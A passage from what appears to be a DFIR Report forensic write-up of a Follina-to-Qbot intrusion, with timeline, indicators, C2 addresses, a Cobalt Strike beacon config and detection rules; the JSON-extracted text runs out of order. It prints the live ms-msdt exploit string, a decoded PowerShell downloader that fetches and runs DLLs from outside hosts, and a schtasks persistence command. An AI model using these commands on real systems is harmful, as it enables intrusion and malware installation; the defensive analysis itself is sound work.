\"AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\", \"crypto_scheme\": 0, \"proxy\": { \"type\": null, \"username\": null, \"password\": null, \"behavior\": \"Use IE settings\" }, \"http_post_chunk\": 0, \"uses_cookies\": true, \"post-ex\": { \"spawnto_x86\": \"%windir%\\\\syswow64\\\\WerFault.exe\", \"spawnto_x64\": \"%windir%\\\\sysnative\\\\WerFault.exe\" }, \"process-inject\": { \"allocator\": \"VirtualAllocEx\", \"execute\": [ \"CreateThread\", \"RtlCreateUserThread\", \"CreateRemoteThread\" ], \"min_alloc\": 29879, \"startrwx\": false, \"stub\": \"pJ9URfAanzJA7qnkbuZsgQ==\", \"transform-x86\": [ \"prepend '\\\\x90\\\\x90\\\\x90\\\\x90\\\\x90\\\\x90'\" ], \"transform-x64\": [ \"prepend '\\\\x90\\\\x90\\\\x90\\\\x90\\\\x90\\\\x90'\" ], \"userwx\": false }, \"dns-beacon\": { \"dns_idle\": null, \"dns_sleep\": null, \"maxdns\": null, \"beacon\": null, \"get_A\": null, \"get_AAAA\": null, \"get_TXT\": null, \"put_metadata\": null, \"put_output\": null }, \"pipename\": null, \"smb_frame_header\": \"AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\", \"stage\": { \"cleanup\": true }, \"ssh\": { \"hostname\": null, \"port\": null, \"username\": null, \"password\": null, \"privatekey\": null } } The remote admin tool named client32.exe (NetSupport Manager) and its associated libraries were dropped on a workstation in the C:\\ProgramData\\MSN Devices directory. The exchanged network traffic was unencrypted and contained the custom user-agent NetSupport Manager/1.3 The threat actor installed and enabled the Atera RMM agent on the domain controller. The MSI installer, named setup_undefined.msi was configured to drop the installation files in the C:\\Program Files\\ATERA Networks\\AteraAgent directory. Atera integrated with another remote admin tool known as \u201c SplashTop \u201c, which it dropped on the file system. Periodic \u2018heartbeat\u2019 process events of Atera were observed: \"C:\\Program Files\\ATERA Networks\\AteraAgent\\Packages\\AgentPackageHeartbeat\\AgentPackageHeartbeat.exe\" 84a4a63b-8338-4a34-a73b-5a5958eac32c \"3f9a2c8a-b755-4c69-bae0-587bafff46ed\" agent-api.atera.com/Production 443 or8ixLi90Mf \"heartbeat\" The \u201cSplashtop\u201d remote admin tool was started as a background process. \"C:\\Windows\\TEMP\\SplashtopStreamer3500.exe\" prevercheck /s /i sec_opt=0,confirm_d=0,hidewindow=1 Both remote admin tools allowed the threat actors to persist and obtain remote access to the environment, without relying on RDP. The Atera Agent account used was retained in the host Software registry hive: Exfiltration No exfiltration observed. Impact Sensitive documents (.pdf, .docx) were viewed in a RDP session on the file server using Notepad++ and Wordpad. After this, no further activity from the threat actor was observed. Indicators Atomic ATERA Integrator Login ID cadencefitzp.atrickzx@gmail[.]com DNS Requests www.stanzatextbooks[.]com www.framemymirror[.]com www.coolwick[.]com www.ajparts.co[.]uk incredibletadoba[.]com ibuonisani[.]it gruposolel[.]com foxmotorent[.]com egofit.co[.]uk edifica[.]ro dwm-me[.]com cursosfnn[.]com cemavimx[.]com atlasbar[.]net Qbot C2 IP\u2019s observed in traffic 144[.]202[.]3[.]39:443 67[.]209[.]195[.]198:443 176[.]67[.]56[.]94:443 72[.]252[.]157[.]93:995 90[.]120[.]65[.]153:2078 72[.]252[.]157[.]93:990 86[.]97[.]9[.]190:443 37[.]34[.]253[.]233:443 23[.]111[.]114[.]52:65400 Cobalt Strike 190[.]123[.]44[.]126:443 Qbot C2 IPv4s in registry key 38[.]70[.]253[.]226:2222 182[.]191[.]92[.]203:995 37[.]186[.]54[.]254:995 140[.]82[.]63[.]183:443 41[.]86[.]42[.]158:995 89[.]101[.]97[.]139:443 201[.]145[.]165[.]25:443 173[.]21[.]10[.]71:2222 82[.]41[.]63[.]217:443 73[.]151[.]236[.]31:443 149[.]28[.]238[.]199:443 83[.]110[.]218[.]147:993 86[.]195[.]158[.]178:2222 120[.]61[.]1[.]114:443 140[.]82[.]49[.]12:443 86[.]97[.]9[.]190:443 92[.]132[.]172[.]197:2222 201[.]142[.]177[.]168:443 82[.]152[.]39[.]39:443 45[.]46[.]53[.]140:2222 71[.]24[.]118[.]253:443 45[.]76[.]167[.]26:443 144[.]202[.]2[.]175:995 24[.]55[.]67[.]176:443 125[.]24[.]187[.]183:443 24[.]178[.]196[.]158:2222 187[.]207[.]131[.]50:61202 78[.]101[.]193[.]241:6883 202[.]134[.]152[.]2:2222 103[.]246[.]242[.]202:443 39[.]52[.]41[.]80:995 187[.]251[.]132[.]144:22 72[.]27[.]33[.]160:443 102[.]182[.]232[.]3:995 176[.]67[.]56[.]94:443 201[.]172[.]23[.]68:2222 37[.]34[.]253[.]233:443 94[.]26[.]122[.]9:995 5[.]32[.]41[.]45:443 96[.]37[.]113[.]36:993 93[.]48[.]80[.]198:995 148[.]64[.]96[.]100:443 39[.]44[.]158[.]215:995 67[.]69[.]166[.]79:2222 45[.]63[.]1[.]12:443 31[.]48[.]174[.]63:2078 196[.]203[.]37[.]215:80 144[.]202[.]3[.]39:995 1[.]161[.]101[.]20:443 197[.]164[.]182[.]46:993 144[.]202[.]2[.]175:443 5[.]203[.]199[.]157:995 217[.]165[.]79[.]88:443 120[.]150[.]218[.]241:995 217[.]128[.]122[.]65:2222 85[.]246[.]82[.]244:443 94[.]71[.]169[.]212:995 177[.]205[.]155[.]85:443 79[.]80[.]80[.]29:2222 124[.]40[.]244[.]115:2222 106[.]51[.]48[.]170:50001 94[.]36[.]193[.]176:2222 85[.]255[.]232[.]18:443 89[.]211[.]179[.]247:2222 189[.]253[.]206[.]105:443 69[.]14[.]172[.]24:443 83[.]110[.]92[.]106:443 72[.]252[.]157[.]93:995 208[.]101[.]82[.]0:443 172[.]115[.]177[.]204:2222 174[.]69[.]215[.]101:443 74[.]14[.]5[.]179:2222 140[.]82[.]63[.]183:995 210[.]246[.]4[.]69:995 109[.]12[.]111[.]14:443 148[.]0[.]56[.]63:443 121[.]7[.]223[.]45:2222 47[.]156[.]131[.]10:443 40[.]134[.]246[.]185:995 84[.]241[.]8[.]23:32103 75[.]99[.]168[.]194:443 172[.]114[.]160[.]81:995 75[.]99[.]168[.]194:61201 108[.]60[.]213[.]141:443 217[.]165[.]176[.]49:2222 177[.]156[.]191[.]231:443 32[.]221[.]224[.]140:995 76[.]70[.]9[.]169:2222 111[.]125[.]245[.]116:995 39[.]49[.]96[.]122:995 143[.]0[.]219[.]6:995 67[.]165[.]206[.]193:993 39[.]41[.]29[.]200:995 191[.]112[.]25[.]187:443 41[.]84[.]229[.]240:443 80[.]11[.]74[.]81:2222 144[.]202[.]3[.]39:443 217[.]164[.]121[.]161:1194 89[.]86[.]33[.]217:443 201[.]242[.]175[.]29:2222 31[.]35[.]28[.]29:443 124[.]109[.]35[.]32:995 217[.]164[.]121[.]161:2222 39[.]44[.]213[.]68:995 208[.]107[.]221[.]224:443 24[.]139[.]72[.]117:443 47[.]157[.]227[.]70:443 175[.]145[.]235[.]37:443 63[.]143[.]92[.]99:995 149[.]28[.]238[.]199:995 186[.]90[.]153[.]162:2222 179[.]100[.]20[.]32:32101 190[.]252[.]242[.]69:443 47[.]23[.]89[.]60:993 90[.]120[.]65[.]153:2078 81[.]215[.]196[.]174:443 70[.]46[.]220[.]114:443 76[.]25[.]142[.]196:443 41[.]38[.]167[.]179:995 70[.]51[.]135[.]90:2222 67[.]209[.]195[.]198:443 42[.]228[.]224[.]249:2222 177[.]94[.]57[.]126:32101 104[.]34[.]212[.]7:32103 41[.]230[.]62[.]211:995 177[.]209[.]202[.]242:2222 105[.]27[.]172[.]6:443 46[.]107[.]48[.]202:443 86[.]98[.]149[.]168:2222 173[.]174[.]216[.]62:443 187[.]149[.]236[.]5:443 88[.]224[.]254[.]172:443 45[.]76[.]167[.]26:995 72[.]252[.]157[.]93:993 197[.]89[.]8[.]51:443 41[.]215[.]153[.]104:995 1[.]161[.]101[.]20:995 117[.]248[.]109[.]38:21 179[.]158[.]105[.]44:443 91[.]177[.]173[.]10:995 72[.]252[.]157[.]93:990 45[.]63[.]1[.]12:995 189[.]146[.]90[.]232:443 180[.]129[.]108[.]214:995 Files liidfxngjotktx.dll 5abb2c12f066ce32a0e4866fb5bb347f dab316b8973ecc9a1893061b649443f5358b0e64 077ca8645a27c773d9c881aecf54bc409c2f8445ae8e3e90406434c09ace4bc2 doc532.docx e7015438268464cedad98b1544d643ad 03ef0e06d678a07f0413d95f0deb8968190e4f6b d20120cc046cef3c3f0292c6cbc406fcf2a714aa8e048c9188f1184e4bb16c93 client32.exe f76954b68cc390f8009f1a052283a740 3112a39aad950045d6422fb2abe98bed05931e6c 63315df7981130853d75dc753e5776bdf371811bcfce351557c1e45afdd1ebfb Detections Network ET RPC DCERPC SVCCTL - Remote Service Control Manager Access ET POLICY SMB2 NT Create AndX Request For a DLL File - Possible Lateral Movement ET POLICY SMB Executable File Transfer ET MALWARE Observed Qbot Style SSL Certificate ET CNC Feodo Tracker Reported CnC Server group 24 ET CNC Feodo Tracker Reported CnC Server group 6 ET HUNTING Observed Let's Encrypt Certificate for Suspicious TLD (.icu) ET INFO NetSupport Remote Admin Checkin ET POLICY HTTP traffic on port 443 (POST) ET POLICY NetSupport GeoLocation Lookup Request ET INFO Splashtop Domain (splashtop .com) in TLS SNI ET SCAN Behavioral Unusual Port 445 traffic Potential Scan or Infection ET CNC Feodo Tracker Reported CnC Server group 8 ET CNC Feodo Tracker Reported CnC Server group 20 Sigma title: Potential Qbot SMB DLL Lateral Movement id: 3eaa2cee-2dfb-46e9-98f6-3782aab30f38 status: Experimental description: Detection of potential us of SMB to transfer DLL's into the C$ folder of hosts unique to Qbot malware for purposes of lateral movement. author: \\@TheDFIRReport date: 2022/09/12 references: - https://thedfirreport.com/ logsource: product: zeek service: smb_files detection: selection_1: zeek_smb_files_path|endswith: - 'C$' selection_2: file_name|endswith: - '\\.dll.cfg' condition: selection_1 and selection_2 falsepositives: - RMM Tools and Administrative activities in C$ Share. level: medium tags: - attack.lateral_movement - attack.t1570 https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_schtask_creation.yml https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_trust_discovery.yml https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_lolbins_by_office_applications.yml https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_msdt_susp_parent.yml https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_sdiagnhost_susp_child.yml https://github.com/SigmaHQ/sigma/blob/28f8986f7a5767cebf57e5f70d0ea56e29776b83/rules/windows/process_creation/proc_creation_win_schtasks_appdata_local_system.yml https://github.com/SigmaHQ/sigma/blob/8041ab5130ff8f4d44a9fd9454670f329d2727bc/rules/windows/process_creation/proc_creation_win_reg_defender_exclusion.yml https://github.com/SigmaHQ/sigma/blob/329074d935ac81dd91cafdce5e5a43c95cca068d/rules/windows/process_creation/proc_creation_win_esentutl_webcache.yml https://github.com/SigmaHQ/sigma/blob/8bb3379b6807610d61d29db1d76f5af4840b8208/rules/windows/process_creation/proc_creation_win_susp_recon_net_activity.yml https://github.com/SigmaHQ/sigma/blob/04f72b9e78f196544f8f1331b4d9158df34d7ecf/rules/windows/builtin/application/win_software_atera_rmm_agent_install.yml https://github.com/SigmaHQ/sigma/blob/8bb3379b6807610d61d29db1d76f5af4840b8208/rules/windows/process_creation/proc_creation_win_powershell_frombase64string.yml https://github.com/SigmaHQ/sigma/blob/578c838277fdba88704ff3fed3268e87bd7277e0/rules/windows/process_creation/proc_creation_win_schtasks_reg_loader.yml https://github.com/SigmaHQ/sigma/blob/34d16c29dd7d5503e632c8248c44c03c0875e40f/rules/windows/pipe_created/pipe_created_mal_cobaltstrike.yml https://github.com/The-DFIR-Report/Sigma-Rules/blob/c253c57c627b6d8cbcfa06320a3ad1ba2b9dedd4/win_network_splashtop.yml https://github.com/The-DFIR-Report/Sigma-Rules/blob/c253c57c627b6d8cbcfa06320a3ad1ba2b9dedd4/win_software_splashtop.yml MITRE System Owner/User Discovery \u2013 T1033 System Network Connections Discovery \u2013 T1049 Domain Groups \u2013 T1069.002 Domain Trust Discovery \u2013 T1482 PowerShell \u2013 T1059.001 Exploitation for Client Execution \u2013 T1203 Regsvr32 \u2013 T1218.010 Scheduled Task/Job \u2013 T1053 Application Layer Protocol \u2013 T1071 Remote Access Software \u2013 T1219 Ingress Tool Transfer \u2013 T1105 Process Injection \u2013 T1055 Disable or Modify Tools \u2013 T1562.001 LSASS Memory \u2013 T1003.001 Credentials from Web Browsers \u2013 T1555.003 Windows Credential Manager \u2013 T1555.004 Remote Desktop Protocol \u2013 T1021.001 Service Execution \u2013 T1569.002 Lateral Tool Transfer \u2013 T1570 S0154 \u2013 Cobalt Strike S0650 \u2013 QakBot S0552 \u2013 AdFind Internal case #14894 Share this: Share on X (Opens in new window) X Share on LinkedIn (Opens in new window) LinkedIn Share on Reddit (Opens in new window) Reddit Share on Facebook (Opens in new window) Facebook Share on WhatsApp (Opens in new window) WhatsApp Related Post navigation BumbleBee: Round Two BumbleBee Zeros in on Meterpreter Search for: Type your email\u2026 Subscribe Reports Threat Intelligence Detection Rules DFIR Labs Proudly powered by WordPress | Copyright 2023 | The DFIR Report | All Rights Reserved Go Top",
    "filtered_content": "Follina Exploit Leads to Domain Compromise \u2013 The DFIR Report Skip to content Menu Reports Analysts Services Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts Access DFIR Labs Subscribe Contact Us Menu Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts The DFIR Report Real Intrusions by Real Attackers, The Truth Behind the Intrusion Menu Reports Analysts Services Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts Access DFIR Labs Subscribe Contact Us Thursday, February 12, 2026 Menu Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts adfind cobaltstrike Qbot Follina Exploit Leads to Domain Compromise October 31, 2022 In early June 2022, we observed an intrusion where a threat actor gained initial access by exploiting the CVE-2022-30190 (Follina) vulnerability which triggered a Qbot infection chain. Qbot, also known as Qakbot or Pinksliplot is actively developed and capable of a number of functions from reconnaissance, lateral movement, data exfiltration, to delivering other payloads acting as an initial access broker. Qbot is regarded by US CERT as being one of the 2021 Top Malware Strains in Alert (AA22-216A) . In the past we\u2019ve covered other intrusion cases where Qbot was used as an initial access vector. See our reports titled \u201c Qbot and Zerologon Lead To Full Domain Compromise \u201d and \u201c Qbot Likes to Move It, Move It \u201c. In this intrusion, soon after execution of the Qbot payload, the malware established C2 connectivity and performed discovery activity on the beachhead host. Along the way, the threat actors pivoted to multiple systems and installed remote management tools such as NetSupport and Atera Agent, and utilized the ubiquitous Cobalt Strike for maintaining access to the network. The intrusion lasted 2 days, and the attackers ultimately showed interest in accessing sensitive documents hosted on a file server, after which, they exited the environment. Case Summary In this intrusion, a threat actor abused the CVE-2022-30190 (Follina) vulnerability, where exploit code was embedded inside a malicious Word document to gain initial access. We assess with medium to high confidence that the documents likely arrived by the means of thread-hijacked emails from distribution channels used by TA570 . Upon execution of the weaponized Word document, a HTML file was retrieved from a remote server containing a PowerShell payload. The payload contains base64-encoded content and is used to download Qbot DLLs inside the user\u2019s Temp directory. The Qbot DLL was executed via regsvr32.exe and the activity was immediately followed by injection into legitimate processes (explorer.exe) on the host. The injected process spawned Windows utilities such as whoami , net.exe and nslookup , to perform discovery activity and also established connection to Qbot C2 servers. Almost an hour later, the threat actors leveraged a Windows built-in utility, esentutl.exe , to extract browser data, a technique also observed in earlier cases. [ 1 ][ 2 ] Qbot used scheduled task creation as a persistence mechanism. The scheduled task contained a PowerShell command referencing multiple C2 IP addresses stored as base64-encoded blob in randomly named keys under the HKCU registry hive. After this activity, the threat actor proceeded with the remote creation of Qbot DLLs over SMB on multiple hosts throughout the environment. They then added multiple folders to the Windows Defender exclusions list on each of the infected machines to evade defenses, as we have seen before with Qbot. Remote services were then used to execute the DLLs. A Cobalt Strike server connection was witnessed within the first hour, but it wasn\u2019t until after lateral movement occurred that activity from that server began. Utilities such as nltest.exe and AdFind were executed by the injected Cobalt Strike process (explorer.exe). The injected process was also used to access the LSASS system process. Then, the threat actors installed a remote management tool named NetSupport Manager. Within 20 minutes of the installation, the threat actor moved laterally to the domain controller via a Remote Desktop session. On the domain controller, the tool Atera Remote Management was deployed, a popular tool used by attackers for controlling victim machines. This was the last adversarial activity observed for the day. The threat actors checked-in early the next day and downloaded a tool named Network Scanner by SoftPerfect on a domain controller. The tool was executed, which ran a port scan across the network. Finally, the threat actors connected to one of the file share servers via RDP and accessed sensitive documents. No further attacker activity was observed before the threat actors were evicted from the environment. Services We offer multiple services including a Threat Feed service which tracks Command and Control frameworks such as Cobalt Strike, Qbot, Covenant, Metasploit, Empire, PoshC2, etc. More information on this service and others can be found here . We also have artifacts and IOCs available from this case such as pcaps, memory captures, files, event logs including Sysmon, Kape packages, and more, under our Security Researcher and Organization services. Timeline Analysis and reporting completed by @ pigerlin , @yatinwad and @_pete_0 . Infection graph: Initial Access Ever since the disclosure of the Follina vulnerability (CVE-2022-30190) earlier this year, threat actors have been known to leverage the flaw in various phishing campaigns. Delivery of this intrusion was linked to TA570, using hijacked email threads to deliver the initial payload. This intrusion started after a Word document, weaponized with Follina exploit code, was used to deliver and infect the host with Qbot malware. When dealing with a Word document based on the OOXML format, associated files and folders are stored within a compressed ZIP archive. These items can be easily extracted by using an arbitrary zip utility like unzip . One of the embedded files that requires inspection during the analysis of a Follina maldoc, is named document.xml.rels This \u201crelationship\u201d (RELS) file contained an external reference to a remote HTML file, configured to be retrieved and loaded when the Word document is opened, or viewed in Preview Mode. At the bottom of the retrieved HTML page source, the script tag was defined and contained malicious JavaScript code that called the ms-msdt scheme. ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'Unicode.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'JABwACAAPQAgACQARQBuAHYAOgB0AGUAbQBwADsAaQB3AHIAIABoAHQAdABwADoALwAvADEAMAA0AC4AMwA2AC4AMgAyADkALgAxADMAOQAvACQAKAByAGEAbgBkAG8AbQApAC4AZABhAHQAIAAtAE8AdQB0AEYAaQBsAGUAIAAkAHAAXAB0AC4AQQA7AGkAdwByACAAaAB0AHQAcAA6AC8ALwA4ADUALgAyADMAOQAuADUANQAuADIAMgA4AC8AJAAoAHIAYQBuAGQAbwBtACkALgBkAGEAdAAgAC0ATwB1AHQARgBpAGwAZQAgACQAcABcAHQAMQAuAEEAOwBpAHcAcgAgAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADMANAAuADIANAA3AC4AMQAxADkALwAkACgAcgBhAG4AZABvAG0AKQAuAGQAYQB0ACAALQBPAHUAdABGAGkAbABlACAAJABwAFwAdAAyAC4AQQA7AHIAZQBnAHMAdgByADMAMgAgACQAcABcAHQALgBBADsAcgBlAGcAcwB2AHIAMwAyACAAJABwAFwAdAAxAC4AQQA7AHIAZQBnAHMAdgByADMAMgAgACQAcABcAHQAMgAuAEEA'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\" When a system is vulnerable to Follina (CVE-2022-30190), the code will be interpreted and executed by msdt.exe (Microsoft Support Diagnostic Tool). A good detection opportunity is to monitor for this process being spawned by a Microsoft Office application such as WINWORD.EXE In our case, the payload contained base64-encoded PowerShell code. The decoded payload is also logged in EventID 4104 (script block logging) upon execution by the PowerShell engine. The Follina payload was designed to download Qbot libraries from three different URLs, drop the files inside the user\u2019s temp directory, and finally execute the DLLs using regsvr32.exe $p = $Env:temp iwr http://104.36.229.139/$(random).dat -OutFile $p\\t.A iwr http://85.239.55.228/$(random).dat -OutFile $p\\t1.A iwr http://185.234.247.119/$(random).dat -OutFile $p\\t2.A regsvr32 $p\\t.A regsvr32 $p\\t1.A regsvr32 $p\\t2.A Execution Upon execution of the MSDT payload, a new instance of the sdiagnhost.exe (Scripted Diagnostics Native Host) was spawned. This process was ultimately responsible for invoking the Follina payload, starting, in our case, three child instances of regsrv32.exe . After execution of the payload, the XML file PCW.debugreport.xml was created in the %localappdata%\\Diagnostics. directory. This file can serve as a valuable artifact when analyzing Follina exploitation (attempts). The payload, preceded by its recursive path, can be found in the TargetPath element of this XML-file. The payload configured to execute on the system is embedded in this file. Persistence Qbot maintained persistence by creating scheduled tasks across multiple endpoints. An example of a command that was executed can be seen below: schtasks.exe /Create /F /TN \"{E9ADEA37-C329-4967-9CF5-2682DA7D97BE}\" /TR \"cmd /c start /min \\\"\\\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\Benfouqcgq).rxftejkhydnwmpt))) The scheduled task creation events were recorded in the Microsoft-Windows-TaskScheduler/Operational log. Inspection of the scheduled task showed that PowerShell referenced a registry key with a random generated value. This value differed from endpoint to endpoint: The data of this registry key consisted of a base64-encoded string: Decoding the base64-encoded string revealed a significant number of QBot\u2019s C2 IPv4 addresses and ports: C2 IPv4s are provided in the IoC section of this report. The SysWow64\\Explorer.exe process was also observed cycling through a number of domains \u2013 indicated by the DNS requests with a QueryStatus of RCODE:0 (NO ERROR). In addition, several connectivity checks were made to email relay services: Defense Evasion As reported earlier this year, QBot is known for using process hollowing. In this case, the 32-bit version of explorer.exe (indicated by the use of C:\\Windows\\SysWOW64) was started in a suspended state, which was then used as a target for injection. Inspecting memory dumped from the host, the injected processes were easy to discover using Volatility and the malfind module. Looking for output that included explorer.exe and contains the VAD tag PAGE_EXECUTE_READWRITE and MZ headers in the memory space, common attributes observed for process injection in memory. The injected explorer.exe process was used to spawn and inject into additional instances of explorer.exe (32-bit). An example event can be seen below. Source PID 11672 belonging to QBot, injected a DLL into PID 3592, which we discovered was part of Cobalt Strike C2 communication Using the injected process id\u2019s, and process names, we can then match that to the network connections observed using the volatility netscan module, discovering both the injected Qbot (PID 3992) and Cobalt strike (PID 5620) explorer processes. (The data below comes from a different host than the prior log.) Various folders were added as an exclusion for Windows Defender, commonly used by QBot, as a \u2018drop zone\u2019 for both execution and persistence. Credential Access Qbot attempted to steal credentials from the Credentials Manager. On one of the targeted systems, the injected explorer process opened a handle with suspicious access rights to a thread in the LSASS process. Credential dumping tools like Mimikatz often request this level of access and corresponds to the following access rights: PROCESS_VM_READ (0x0010) PROCESS_QUERY_INFORMATION (0x0400) PROCESS_QUERY_LIMITED_INFORMATION (0x1000) PROCESS_ALL_ACCESS (0x1fffff) We observed the LSASS process interaction from the injected Explorer process at two different access levels, 0x1410: In addition, on one host, the average LSASS interaction, with access right 0x1FFFFF (PROCESS_ALL_ACCESS) by the explorer process was ~13K every two hours. A significant volume of events. The article \u201c You Bet Your Lsass: Hunting LSASS Access \u201d by Splunk details examples of LSASS credential dumping. Discovery The following discovery commands were initiated by Qbot through the injected process on the beachhead system: whoami /all cmd /c set net view /all ipconfig /all net share nslookup -querytype=ALL -timeout=12 _ldap._tcp.dc._msdcs.DOMAIN net localgroup netstat -nao route print net group /domain net group \"Domain Computers\" /domain C:\\Windows\\System32\\cmd.exe /C c:\\windows\\sysnative\\nltest.exe /domain_trusts /all_trusts Later, more discovery commands were observed from the Cobalt Strike injected process on another victim system: net group \"domain controllers\" /dom net group \"domain admins\" /dom C:\\Windows\\system32\\cmd.exe /C ping -n 1 <Redacted> On the same host, AdFind was executed to enumerate all computer objects in the Active Directory domain: On second day of the intrusion, threat attackers downloaded a tool named Network Scanner (netscan.exe) by SoftPerfect on the domain controller, using Internet Explorer. The tool was used to trigger another port scan, this time targeting TCP ports 445 and 3389. Periodic requests to api.ipify.org were observed throughout the intrusion by the SysWOW64\\Explorer process and by the ATERA agent. Ipify.org can be used to determine the public facing IPv4 address of the network. We\u2019ve observed the use of ipify.org in previous cases. Lateral Movement Qbot DLLs were created remotely from the beachhead host and saved in the administrative C$ share of other hosts within the network. This activity was also clearly visible in Zeek SMB File data in the network. A local service was also registered on each of the targeted systems, configured to execute the Qbot DLL using regsvr32.exe The following Suricata signatures identified both the remote file creation and service registration events: ET RPC DCERPC SVCCTL - Remote Service Control Manager Access ET POLICY SMB Executable File Transfer ET POLICY SMB2 NT Create AndX Request For a DLL File - Possible Lateral Movement Execution of the new service was observed shorty after invoking the Qbot DLL. The threat actor also used RDP to pivot between systems on the network such as a domain controller and a file server. The creation of the rdpclip.exe process on the target host is another indication that a RDP connection was successful. The start of this process by a non-human account is another great detection opportunity. Collection Qbot used various information stealing modules to extract sensitive information from the beachhead host. Outlook was started, possibly to steal e-mail messages. However, we could not find evidence to conclusively support this. Qbot also used the Windows built-in utility esentutl.exe to extract browser data from Internet Explorer and Microsoft Edge: esentutl.exe /r V01 /l\"C:\\Users\\<redacted>\\AppData\\Local\\Microsoft\\Windows\\WebCache\" /s\"C:\\Users\\<redacted>\\AppData\\Local\\Microsoft\\Windows\\WebCache\" /d\"C:\\Users\\<redacted>\\AppData\\Local\\Microsoft\\Windows\\WebCache\" On a file server, we observed the threat actor manually inspecting files using various built-in viewers. For example, for viewing PDF files, Internet Explorer was used to view these files. For DOCX files, WordPad was used. An indication that these files were viewed locally on the network, was the presence of the \u2018OpenWith\u2019 process: Command and Control The following C2 IP-addresses/domains belonging to Qbot were recorded during this intrusion: 144.202.3[.]39 subject: CN=pesqfbmfk.us,OU=Mklbwanvv Kibn Fykniqfvki,C=FR, issuer: CN=pesqfbmfk.us,O=Jgi Vwmmuia Inc.,L=Rnhsjsu Bbrwua,ST=QQ,C=FR ja3: 72a589da586844d7f0818ce684948eea ja3s: 8ed408107f89c53261bf74e58517bc76 176.67.56[.]94 domain: visdeirun.net issuer: Scau Lofoefo Cubhfilnb Ixtfb ja3: 72a589da586844d7f0818ce684948eea ja3s: 7c02dbae662670040c7af9bd15fb7e2f 72.252.157[.]93 subject: CN=rfhmw.biz,OU=Yoefut,C=ES, issuer: CN=rfhmw.biz,O=Umalauqv Tyv LLC.,L=Ojaomei Xyaik,ST=LO,C=ES ja3: 72a589da586844d7f0818ce684948eea ja3s: 7c02dbae662670040c7af9bd15fb7e2f 90.120.65[.]153 subject: CN=jaubai.net,OU=Naha,C=AU, issuer: CN=jaubai.net,O=Riwi Ohbptdbe LLC.,L=Bia,ST=PX,C=AU ja3: 72a589da586844d7f0818ce684948eea ja3s: 7c02dbae662670040c7af9bd15fb7e2f 67.209.195[.]198 domain: visdeirun.net issuer: Aigmx Ijocl Ooeymfx Eiav LLC. ja3: 72a589da586844d7f0818ce684948eea ja3s: 7c02dbae662670040c7af9bd15fb7e2f The (default) named pipe postex_4c14 was observed from a Cobalt Strike injected explore.exe process. After dumping one of the injected explorer.exe processes, we were able to extract the beacon configuration using the 1768.py tool, by Didier Stevens. More details about this IP-address: 190.123.44[.]126 certificate.version: 3, certificate.serial: 048734AF86D7FBFE4F2161FA60799FD94C5C, certificate.subject: CN=mssfr.icu, certificate.issuer: CN=R3,O=Let's Encrypt,C=US, certificate.not_valid_before: 1653499104, certificate.not_valid_after: 1661275103, certificate.key_alg: rsaEncryption, certificate.sig_alg: sha256WithRSAEncryption, certificate.key_type: rsa, certificate.key_length: 2048, certificate.exponent: 65537, san.dns: [ mssfr.icu, ns1.mssfr.icu, ns2.mssfr.icu, ns3.mssfr.icu, ns4.mssfr.icu ] ja3: 72a589da586844d7f0818ce684948eea ja3s: ae4edc6faf64d08308082ad26be60767 Cobalt Strike config: { \"beacontype\": [ \"HTTPS\" ], \"sleeptime\": 50845, \"jitter\": 33, \"maxgetsize\": 2796804, \"spawnto\": \"AAAAAAAAAAAAAAAAAAAAAA==\", \"license_id\": 426352781, \"cfg_caution\": false, \"kill_date\": null, \"server\": { \"hostname\": \"190.123.44.126\", \"port\": 443, \"publickey\": \"MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCCECwaMVRPp+F4nPGpvBL6UPyzeC6MLum39i8TGRcleTtJowVYODCJ3sJPL/0ZAPx+tvaxyzR4wfwGUsPKf9AClWbCWREmZzCyYq2G9RPsGC94ywE68mFQJk3qjZH0scYOVcLz5snPsRWn5U2joATJesQWQ/EnQMZadYFa73i8YQIDAQABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==\" }, \"host_header\": \"\", \"useragent_header\": null, \"http-get\": { \"uri\": \"/maximum.png\", \"verb\": \"GET\", \"client\": { \"headers\": null, \"metadata\": null }, \"server\": { \"output\": [ \"print\", \"prepend 600 characters\", \"base64\", \"netbios\" ] } }, \"http-post\": { \"uri\": \"/dividend\", \"verb\": \"POST\", \"client\": { \"headers\": null, \"id\": null, \"output\": null } }, 